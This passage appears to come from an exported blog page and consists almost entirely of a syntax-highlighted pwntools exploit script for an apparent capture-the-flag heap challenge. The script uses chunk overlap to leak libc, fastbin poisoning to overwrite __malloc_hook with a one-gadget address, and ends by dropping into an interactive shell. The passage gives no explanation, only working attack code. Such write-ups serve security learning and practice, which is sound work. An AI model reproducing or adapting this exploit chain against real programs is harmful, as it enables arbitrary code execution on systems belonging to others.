punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>malloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">88</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>libc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload<span class=\"token operator\">=</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        }
    ]
}